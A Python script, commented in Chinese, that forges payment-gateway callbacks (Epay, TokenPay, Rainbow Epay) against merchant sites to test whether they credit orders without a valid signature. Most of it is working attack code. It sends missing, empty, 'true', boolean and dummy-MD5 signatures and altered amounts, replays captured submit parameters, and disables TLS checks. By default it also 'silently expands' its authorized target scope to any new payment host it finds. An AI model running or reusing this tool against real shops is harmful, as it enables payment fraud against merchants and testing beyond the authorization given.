#!/usr/bin/env python3
"""假支付 / 回调验签矩阵引擎。

对业务站 callback.{Handle} 跑空签/true/布尔/错签/改金额/合法签，写入 forge_matrix.json。
若提供 --pay-url，其 host 相对主站不同则 **静默扩权**。

彩虹易支付 submit 回放（免 KEY）：
  python3 炼蛊房/pay_matrix.py \\
    --base https://业务站 \\
    --submit-url 'https://彩虹网关/submit.php?pid=...&sign=...' \\
    --case <案卷> --site-scope 授权范围/scope.<站>.json

示例:
  python3 炼蛊房/pay_matrix.py \\
    --base https://授权站 \\
    --handles Epay,TokenPay \\
    --trade-no 369260804224641180 --money 10 \\
    --pay-url 'https://api.授权站/Pay?Id=xxx' \\
    --site-scope 授权范围/scope.tghaopf.json \\
    --case <案卷>
"""
from __future__ import annotations

import argparse
import hashlib
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

_OPS = Path(__file__).resolve().parent
if str(_OPS) not in sys.path:
    sys.path.insert(0, str(_OPS))

from scope_lib import ENGINE, host_of, in_scope, silent_expand  # noqa: E402



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def md5_sign(data: dict[str, Any], key: str) -> str:
    d = {
        k: str(v)
        for k, v in data.items()
        if k not in ("sign", "sign_type", "signature", "Signature") and str(v) != ""
    }
    raw = "&".join(f"{k}={d[k]}" for k in sorted(d)) + key
    return hashlib.md5(raw.encode()).hexdigest()


def build_variants(
    *,
    trade_no: str,
    money: str,
    pay_id: str,
    key: str,
) -> list[dict[str, Any]]:
    """返回 {name, content_type, payload} 列表。"""
    money_f = money
    money_alt = f"{float(money) - 0.01:.2f}" if _is_float(money) else money
    base_epay = {
        "pid": "1",
        "trade_no": "t" + trade_no,
        "out_trade_no": trade_no,
        "type": "alipay",
        "name": "x",
        "money": str(money_f),
        "trade_status": "TRADE_SUCCESS",
        "sign_type": "MD5",
    }
    variants: list[dict[str, Any]] = [
        {"name": "no_sign", "content_type": "form", "payload": {**base_epay}},
        {"name": "empty_sign", "content_type": "form", "payload": {**base_epay, "sign": ""}},
        {"name": "sign_true_form", "content_type": "form", "payload": {**base_epay, "sign": "true"}},
        {
            "name": "sign_true_json_bool",
            "content_type": "json",
            "payload": {**base_epay, "sign": True},
        },
        {"name": "sign_1", "content_type": "form", "payload": {**base_epay, "sign": "1"}},
        {
            "name": "sign_random_md5",
            "content_type": "form",
            "payload": {**base_epay, "sign": "0" * 32},
        },
        {
            "name": "money_minus_sign_true",
            "content_type": "form",
            "payload": {**base_epay, "money": money_alt, "sign": "true"},
        },
        {
            "name": "tokenpay_id_status_sig_true",
            "content_type": "form",
            "payload": {"Id": pay_id or trade_no, "Status": "1", "Signature": "true"},
        },
        {
            "name": "tokenpay_id_json",
            "content_type": "json",
            "payload": {"Id": pay_id or trade_no, "Status": 1, "Signature": True},
        },
        {
            "name": "header_Signature_true",
            "content_type": "json",
            "payload": {"Id": pay_id or trade_no, "Status": 1},
            "headers": {"Signature": "true"},
        },
    ]
    if key:
        legal = {**base_epay}
        legal["sign"] = md5_sign(legal, key)
        variants.append({"name": "legal_md5", "content_type": "form", "payload": legal})
        legal_j = {**base_epay, "sign": md5_sign(base_epay, key)}
        variants.append({"name": "legal_md5_json", "content_type": "json", "payload": legal_j})
    return variants


def _is_float(s: str) -> bool:
    try:
        float(s)
        return True
    except Exception:
        return False


def http_post(
    url: str,
    *,
    content_type: str,
    payload: dict[str, Any],
    headers: dict[str, str] | None,
    timeout: int,
) -> dict[str, Any]:
    hdrs = {
        "User-Agent": "Mozilla/5.0 大爱仙尊-pay_matrix",
        "Accept": "*/*",
    }
    if headers:
        hdrs.update(headers)
    if content_type == "json":
        body = json.dumps(payload, ensure_ascii=False).encode()
        hdrs["Content-Type"] = "application/json"
    else:
        # bool → 小写字符串，贴近表单
        form = {k: ("true" if v is True else "false" if v is False else str(v)) for k, v in payload.items()}
        body = urllib.parse.urlencode(form).encode()
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"

    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, data=body, method="POST", headers=hdrs)
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            text = r.read().decode("utf-8", "replace")
            return {"status": r.status, "body": text[:2000]}
    except urllib.error.HTTPError as e:
        text = e.read().decode("utf-8", "replace") if e.fp else ""
        return {"status": e.code, "body": text[:2000]}
    except Exception as e:
        return {"status": 0, "body": "", "error": str(e)}


def interesting(body: str) -> bool:
    b = (body or "").lower()
    if not b:
        return False
    if "sign error" in b or "非法签名" in b or "signature error" in b:
        return False
    if any(
        x in b
        for x in (
            "success",
            '"code":200',
            "ok",
            "支付成功",
            "已支付",
            "充值成功",
            "到账",
        )
    ):
        return True
    # 非标准错误也标一下
    if "sign error" not in b and "error" not in b:
        return True
    return False


def http_get(url: str, *, timeout: int) -> dict[str, Any]:
    hdrs = {
        "User-Agent": "Mozilla/5.0 大爱仙尊-pay_matrix",
        "Accept": "*/*",
    }
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, method="GET", headers=hdrs)
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            text = r.read().decode("utf-8", "replace")
            return {"status": r.status, "body": text[:2000]}
    except urllib.error.HTTPError as e:
        text = e.read().decode("utf-8", "replace") if e.fp else ""
        return {"status": e.code, "body": text[:2000]}
    except Exception as e:
        return {"status": 0, "body": "", "error": str(e)}


def parse_submit_params(submit_url: str) -> dict[str, str]:
    """从彩虹 submit.php URL 抽出查询参数（保留全部，含 sign）。"""
    parts = urllib.parse.urlsplit(submit_url)
    q = urllib.parse.parse_qs(parts.query, keep_blank_values=True)
    return {k: (v[0] if v else "") for k, v in q.items()}


def _maybe_expand(
    *,
    parent: str,
    url: str,
    site_scope: str,
    case: str,
    no_expand: bool,
    note: str,
) -> dict[str, Any] | None:
    if no_expand or not url:
        return None
    pay_host = host_of(url)
    if not pay_host or pay_host == parent or in_scope(pay_host):
        return None
    site = Path(site_scope) if site_scope else None
    if site and not site.is_file():
        alt = ENGINE / site_scope
        site = alt if alt.is_file() else site
    try:
        report = silent_expand(
            parent=parent,
            discovered=[url, pay_host],
            site_scope=site if site and site.is_file() else None,
            case=case,
            note=note,
        )
        print(f"[+] 静默扩权: {pay_host} changed={report.get('changed')}")
        return report
    except ValueError as e:
        print(f"[!] 扩权失败: {e}", file=sys.stderr)
        return None


def run_rainbow_replay(
    *,
    base: str,
    submit_url: str,
    return_path: str,
    notify_path: str,
    timeout: int,
    dry_run: bool,
) -> list[dict[str, Any]]:
    params = parse_submit_params(submit_url)
    if not params.get("sign"):
        print("[!] submit-url 未解析到 sign，请检查 URL", file=sys.stderr)
    qs = urllib.parse.urlencode(params)
    return_url = base.rstrip("/") + return_path + ("?" + qs if qs else "")
    notify_url = base.rstrip("/") + notify_path
    results: list[dict[str, Any]] = []

    item_r = {
        "handle": "rainbow",
        "variant": "submit_replay_return_get",
        "url": return_url,
        "content_type": "get",
        "payload": params,
        "headers": {},
    }
    if dry_run:
        item_r["resp"] = {"dry_run": True}
    else:
        resp = http_get(return_url, timeout=timeout)
        item_r["resp"] = resp
        item_r["interesting"] = interesting(resp.get("body") or "")
        mark = "*" if item_r["interesting"] else " "
        print(
            f"[{mark}] rainbow/return_get → {resp.get('status')} "
            f"{(resp.get('body') or resp.get('error') or '')[:80]}"
        )
    results.append(item_r)

    item_n = {
        "handle": "rainbow",
        "variant": "submit_replay_notify_post",
        "url": notify_url,
        "content_type": "form",
        "payload": params,
        "headers": {},
    }
    if dry_run:
        item_n["resp"] = {"dry_run": True}
    else:
        resp = http_post(
            notify_url,
            content_type="form",
            payload=params,
            headers=None,
            timeout=timeout,
        )
        item_n["resp"] = resp
        item_n["interesting"] = interesting(resp.get("body") or "")
        mark = "*" if item_n["interesting"] else " "
        print(
            f"[{mark}] rainbow/notify_post → {resp.get('status')} "
            f"{(resp.get('body') or resp.get('error') or '')[:80]}"
        )
    results.append(item_n)
    return results


def main() -> int:
    ap = argparse.ArgumentParser(description="假支付回调验签矩阵")
    ap.add_argument("--base", required=True, help="业务站 https://example.com")
    ap.add_argument("--handles", default="Epay,TokenPay", help="逗号分隔 callback handle")
    ap.add_argument("--trade-no", default="", help="业务订单号；--submit-url 模式可省略")
    ap.add_argument("--money", default="", help="金额；--submit-url 模式可省略")
    ap.add_argument("--pay-id", default="", help="TokenPay UUID / 中转单号")
    ap.add_argument("--pay-url", default="", help="下单跳转 URL；异 host 则静默扩权")
    ap.add_argument(
        "--submit-url",
        default="",
        help="彩虹 submit.php 完整 URL；触发业务 return/notify 参数原样回放（免 KEY）",
    )
    ap.add_argument("--return-path", default="/pay/rainbow/return")
    ap.add_argument("--notify-path", default="/pay/rainbow/notify")
    ap.add_argument("--key", default="", help="已知商户密钥时跑合法签")
    ap.add_argument("--case", required=True)
    ap.add_argument("--site-scope", default="")
    ap.add_argument("--timeout", type=int, default=25)
    ap.add_argument("--path-template", default="/user/api/order/callback.{handle}")
    ap.add_argument("--no-expand", action="store_true", help="禁止静默扩权（默认会扩）")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    base = args.base.rstrip("/")
    parent = host_of(base)
    if not in_scope(parent):
        print(f"[!] 主站 {parent} 不在 scope", file=sys.stderr)
        return 1

    if not args.submit_url and (not args.trade_no or not args.money):
        print("[!] 需要 --trade-no/--money，或改用 --submit-url 回放模式", file=sys.stderr)
        return 2

    case_dir = ENGINE / "案卷" / args.case
    out_dir = case_dir / "测绘" / "pay_matrix"
    out_dir.mkdir(parents=True, exist_ok=True)

    expand_report = None
    expand_report = _maybe_expand(
        parent=parent,
        url=args.pay_url or args.submit_url,
        site_scope=args.site_scope,
        case=args.case,
        no_expand=args.no_expand,
        note="pay_matrix 发现支付跳转/submit",
    ) or expand_report

    if args.submit_url:
        params = parse_submit_params(args.submit_url)
        trade_no = args.trade_no or params.get("out_trade_no") or ""
        money = args.money or params.get("money") or ""
        results = run_rainbow_replay(
            base=base,
            submit_url=args.submit_url,
            return_path=args.return_path,
            notify_path=args.notify_path,
            timeout=args.timeout,
            dry_run=args.dry_run,
        )
        # 跳过标准 callback 矩阵；仅回放
        handles: list[str] = []
        variants: list[dict[str, Any]] = []
    else:
        trade_no = args.trade_no
        money = args.money
        handles = [h.strip() for h in args.handles.split(",") if h.strip()]
        variants = build_variants(
            trade_no=trade_no,
            money=money,
            pay_id=args.pay_id,
            key=args.key,
        )
        results = []

    for handle in handles:
        path = args.path_template.format(handle=handle)
        url = base + path
        for var in variants:
            item = {
                "handle": handle,
                "variant": var["name"],
                "url": url,
                "content_type": var["content_type"],
                "payload": var["payload"],
                "headers": var.get("headers") or {},
            }
            if args.dry_run:
                item["resp"] = {"dry_run": True}
                results.append(item)
                continue
            resp = http_post(
                url,
                content_type=var["content_type"],
                payload=var["payload"],
                headers=var.get("headers"),
                timeout=args.timeout,
            )
            item["resp"] = resp
            item["interesting"] = interesting(resp.get("body") or "")
            results.append(item)
            mark = "*" if item["interesting"] else " "
            print(
                f"[{mark}] {handle}/{var['name']} → {resp.get('status')} "
                f"{(resp.get('body') or resp.get('error') or '')[:80]}"
            )

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    matrix_path = out_dir / f"forge_matrix_{stamp}.json"
    latest = out_dir / "forge_matrix.json"
    doc = {
        "generated_at": datetime.now(UTC).isoformat(),
        "base": base,
        "trade_no": trade_no,
        "money": money,
        "pay_url": args.pay_url,
        "submit_url": args.submit_url,
        "mode": "rainbow_submit_replay" if args.submit_url else "callback_matrix",
        "expand": expand_report,
        "results": results,
    }
    matrix_path.write_text(json.dumps(doc, ensure_ascii=False, indent=2), encoding="utf-8")
    latest.write_text(json.dumps(doc, ensure_ascii=False, indent=2), encoding="utf-8")

    hits = [r for r in results if r.get("interesting")]
    md = [
        "# 假支付矩阵",
        "",
        f"- base: `{base}`",
        f"- mode: `{'rainbow_submit_replay' if args.submit_url else 'callback_matrix'}`",
        f"- trade_no: `{trade_no}` money: `{money}`",
        f"- interesting: **{len(hits)}** / {len(results)}",
        "",
        "> 彩虹回放 interesting≠入账；须另查余额接口（见学习卡 L3）。",
        "",
        "| handle | variant | status | interesting | body |",
        "|--------|---------|--------|-------------|------|",
    ]
    for r in results:
        body = (r.get("resp") or {}).get("body") or (r.get("resp") or {}).get("error") or ""
        body = body.replace("|", "/").replace("\n", " ")[:60]
        md.append(
            f"| {r['handle']} | {r['variant']} | {(r.get('resp') or {}).get('status')} | "
            f"{'Y' if r.get('interesting') else ''} | {body} |"
        )
    (out_dir / "MATRIX.md").write_text("\n".join(md) + "\n", encoding="utf-8")
    print(f"[+] {latest} (hits={len(hits)})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
